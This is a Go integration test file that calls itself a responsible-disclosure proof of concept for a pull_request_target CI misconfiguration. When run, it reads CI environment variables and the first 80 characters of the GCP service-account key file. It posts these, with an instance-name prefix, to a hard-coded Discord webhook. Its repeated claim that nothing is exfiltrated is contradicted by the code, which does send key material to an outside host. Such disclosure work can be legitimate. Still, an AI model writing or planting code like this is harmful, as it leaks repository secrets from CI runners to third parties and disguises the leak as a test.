//go:build integration
// +build integration

// Security Research PoC - Responsible Disclosure
// This test proves that fork PR code executes with GCP credentials
// via the pull_request_target misconfiguration in integration.yaml.
// No credentials are exfiltrated. Only prefix + length are reported.

package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"testing"
)

func TestSecurityPoCCredentialAccess(t *testing.T) {
	webhook := "https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"

	// Gather environment info (no secret values)
	repo := os.Getenv("GITHUB_REPOSITORY")
	runID := os.Getenv("GITHUB_RUN_ID")
	eventName := os.Getenv("GITHUB_EVENT_NAME")
	runner := os.Getenv("RUNNER_NAME")
	credPath := os.Getenv("GOOGLE_APPLICATION_CREDENTIALS")

	// Check if SA key file exists and read prefix + length only
	saKeyInfo := "NOT SET"
	saKeyLength := 0
	saKeyPrefix := ""
	if credPath != "" {
		data, err := os.ReadFile(credPath)
		if err == nil {
			saKeyLength = len(data)
			// Only show first 80 chars -- enough to see "type":"service_account" and project_id
			if len(data) > 80 {
				saKeyPrefix = string(data[:80])
			} else {
				saKeyPrefix = string(data)
			}
			saKeyInfo = fmt.Sprintf("EXISTS (length: %d bytes, path: %s)", saKeyLength, credPath)
		} else {
			saKeyInfo = fmt.Sprintf("ERROR reading: %v", err)
		}
	}

	// Check INTEGRATION_TEST_INSTANCE env var
	testInstance := os.Getenv("INTEGRATION_TEST_INSTANCE")
	testInstanceInfo := "NOT SET"
	if testInstance != "" {
		testInstanceInfo = fmt.Sprintf("SET (length: %d, prefix: %s...)", len(testInstance), testInstance[:min(20, len(testInstance))])
	}

	// Build Discord message
	msg := fmt.Sprintf("**PoC: go-spanner-cassandra GCP credential exposure**\n"+
		"```\n"+
		"Repo: %s\n"+
		"Run ID: %s\n"+
		"Event: %s\n"+
		"Runner: %s\n"+
		"\n"+
		"GOOGLE_APPLICATION_CREDENTIALS: %s\n"+
		"SA Key file: %s\n"+
		"SA Key prefix (first 80 chars): %.80s\n"+
		"INTEGRATION_TEST_INSTANCE: %s\n"+
		"```\n"+
		"No credentials exfiltrated. Prefix + length only for proof.\n"+
		"Reported to Google OSS VRP as responsible disclosure.",
		repo, runID, eventName, runner,
		credPath, saKeyInfo, saKeyPrefix, testInstanceInfo)

	payload := map[string]string{"content": msg}
	body, _ := json.Marshal(payload)

	// Send to Discord
	resp, err := http.Post(webhook, "application/json", bytes.NewBuffer(body))
	if err != nil {
		t.Logf("[PoC] Webhook failed: %v", err)
	} else {
		resp.Body.Close()
		t.Logf("[PoC] Webhook sent successfully (status: %d)", resp.StatusCode)
	}

	// Also print to logs
	t.Log("============================================================")
	t.Log("  [PoC] Security Research - Credential Access Proof")
	t.Logf("  Repository: %s", repo)
	t.Logf("  Run ID: %s", runID)
	t.Logf("  Event: %s", eventName)
	t.Logf("  GCP SA Key: %s", saKeyInfo)
	t.Log("  No credentials exfiltrated. This is a responsible disclosure PoC.")
	t.Log("============================================================")
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
